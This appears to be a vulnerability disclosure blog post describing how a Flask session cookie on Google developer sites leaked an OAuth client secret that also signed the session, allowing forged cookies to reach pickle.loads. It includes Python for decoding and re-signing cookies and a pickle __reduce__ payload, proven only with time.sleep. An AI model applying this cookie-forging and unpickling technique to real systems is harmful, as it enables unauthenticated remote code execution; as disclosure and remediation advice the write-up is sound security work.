title: How I Found a $90,000 Remote Code Execution Vulnerability in Google
excerpt: A Flask cookie on developers.google.com was signed with a secret it carried inside itself. Pulling that secret out turned a forged session into code execution across Google's developer sites.
content_html:
How I found it

I was mapping the OAuth flow that Google’s developer docs sites all share. You hit /oauth2authorize, it sets a Flask session cookie and redirects you to Google’s sign-in page. No account needed:

curl -s -D headers.txt -o /dev/null \
  'https://developers.google.com/oauth2authorize?return_url=%2F'

The cookie caught my eye. It had Flask’s usual three-part session=<payload>.<timestamp>.<signature> format, but at about 1,200 bytes it seemed large for a CSRF token and a return URL. So I decoded it.

Flask session cookies are signed, not encrypted, so the contents are right there for anyone holding one. The leading dot means the payload is zlib-compressed:

import base64
import json
import pickletools
import zlib

payload, timestamp, signature = cookie.rsplit(".", 2)

def b64decode(value):
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))

compressed = payload.startswith(".")
raw = b64decode(payload[1:] if compressed else payload)
session = json.loads(zlib.decompress(raw) if compressed else raw)

That gave me:

{
  "_permanent": true,
  "google_oauth2_csrf_token": "...",
  "google_oauth2_flow_<csrf>": {
    " b": "..."
  }
}

The " b" key is Flask tagging a bytes value. Base64-decoding it gave me a pickle, and pickletools.dis printed an oauth2client.client.OAuth2WebServerFlow object with its fields:

client_id     = "<redacted>.apps.googleusercontent.com"
client_secret = b"<redacted>"

The cookie contained a pickle-serialized payload and Google’s OAuth client_id and client_secret in plaintext. (The secret is redacted here; it was still live at the time of writing.)

I tried the client secret as the Flask SECRET_KEY, and the signature on the issued cookie validated against it. The signing key was stored inside the object it signs.

One secret, two jobs

The leaked client secret was already a problem. I wanted to confirm whether it also signed the session, rather than rely on a guess.

Flask signs through itsdangerous with the cookie-session key derivation, so I recomputed the signature offline:

import hmac

derived_key = hmac.digest(client_secret, b"cookie-session", "sha1")
expected = hmac.digest(
    derived_key,
    f"{payload}.{timestamp}".encode(),
    "sha1",
)

expected came out byte-for-byte identical to the signature on the cookie I’d been handed seconds earlier. To be sure it wasn’t a fluke I flipped one character of the signature (rejected) and re-signed the original payload with the recovered secret (accepted). Session integrity was gone. I could set every key and value in the session and still produce a signature the server would take.

From forged cookie to code execution

The callback reads the flow back out of the session and unpickles it:

session cookie
  -> verify Flask signature
  -> read google_oauth2_flow_<csrf>
  -> base64-decode the bytes
  -> pickle.loads(...)

That pickle.loads is only “safe” as long as nobody else can forge a valid cookie. Once the key is public, that assumption is worthless. I built my own session with a made-up CSRF token and put whatever pickle I wanted under the matching flow key:

session = {
    "_permanent": True,
    "google_oauth2_csrf_token": "attacker-chosen",
    "google_oauth2_flow_attacker-chosen": {
        " b": base64.b64encode(attacker_blob).decode()
    },
}

The state parameter is mine too, so nothing needs to line up on the server’s end. It checks my signature, finds my flow entry, and passes the bytes to pickle.loads.

If you haven’t played with pickle before: the REDUCE opcode names a callable and its arguments, and unpickling just calls it. A public signing key plus this sink is unauthenticated RCE.

I wasn’t about to run commands on Google’s production, so I proved it with time. The payload reduced to time.sleep(N):

class Sleep:
    def __init__(self, seconds):
        self.seconds = seconds

    def __reduce__(self):
        return (time.sleep, (self.seconds,))

Same forged session every time, only the number changed:

time.sleep(0) -> 0.207 s
time.sleep(3) -> 3.193 s
time.sleep(5) -> 5.194 s
time.sleep(8) -> 8.283 s

The response time tracked the number in the pickle, consistent with the server calling sleep(N) during unpickling.

I also tried a few controls to rule out a slow endpoint or jitter:

  • No cookie: Invalid request.
  • One flipped byte in the signature: Invalid request.
  • Valid signature, no flow entry: Invalid request state.
  • Valid signature with the real flow: reached Google’s token exchange and failed later with invalid_grant on my fake auth code.
  • Valid signature with the sleep payload: delayed by exactly the number I picked.

How far it went

The same key worked beyond developers.google.com. I tested valid sessions on these DevSite hosts:

  • firebase.google.com
  • developer.android.com
  • source.android.com
  • docs.partner.android.com

Fixing it

Four changes would address the chain:

  1. Rotate both exposed OAuth client secrets and kill every session signed with them.
  2. Give each deployment its own high-entropy Flask SECRET_KEY from a server-side store, with nothing to do with an OAuth credential.
  3. Keep the OAuth flow object on the server. The cookie should hold an opaque reference and nothing sensitive.
  4. Drop pickle for anything crossing a client boundary. A data-only format with a schema check makes a forged cookie inert.

The chain depended on the exposed secret, its reuse as the signing key, and the callback unpickling data from the session.

    Fixed
